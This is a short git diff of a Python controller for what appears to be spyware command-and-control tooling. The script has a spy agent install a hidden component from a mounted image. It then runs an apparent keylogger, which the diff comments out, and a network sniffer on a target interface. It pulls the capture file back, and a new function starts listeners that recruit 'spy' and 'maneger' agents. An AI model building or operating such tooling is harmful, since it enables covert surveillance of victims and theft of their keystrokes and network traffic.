@@ -64,16 +64,29 @@ def main():
     spyAgent: Agent = op.spyAgent
 
     print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))
-    kligPar = Params()
-    kligPar.kligP = kligPrams(40)
-    kligP = ContParams(KligerType, kligPar)
-    print(spyAgent.runContraption(kligP, 10))
-    sleep(20)
-    print(spyAgent.haltContraption(10))
-    # sniffP = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
-    # print(spyAgent.runContraption(sniffP, 10))
-    # sleep(30)
-    # print(spyAgent.retrieve_file("0.sniff").decode("utf-8"))
+    # kligPar = Params()
+    # kligPar.kligP = kligPrams(40)
+    # kligP = ContParams(KligerType, kligPar)
+    # print(spyAgent.runContraption(kligP, 10))
+    # sleep(20)
+    # print(spyAgent.haltContraption(10))
+    sniffP = ContParams(SnifferType, Params(SniffParams(20, b"ens33")))
+    print(spyAgent.runContraption(sniffP, 10))
+    sleep(30)
+    print(spyAgent.retrieve_file("0.sniff"))
+
+
+def main_with_ui():
+    targetHiderPath = "./sentHider.o"
+    image_path = "fs.iso"
+    mount_path = "fs"
+
+    operDict: dict[str, Operation] = dict()
+    # recrutionEvent = threading.Event()
+    manegerRecruiter = AgentRecruiter(HOST, PORT_MANEGER, operDict, "maneger")
+    spyRecruiter = AgentRecruiter(HOST, PORT_SPYWARE, operDict, "spy")
+    manegerRecruiter.start()
+    spyRecruiter.start()
 
 
 if __name__ == "__main__":
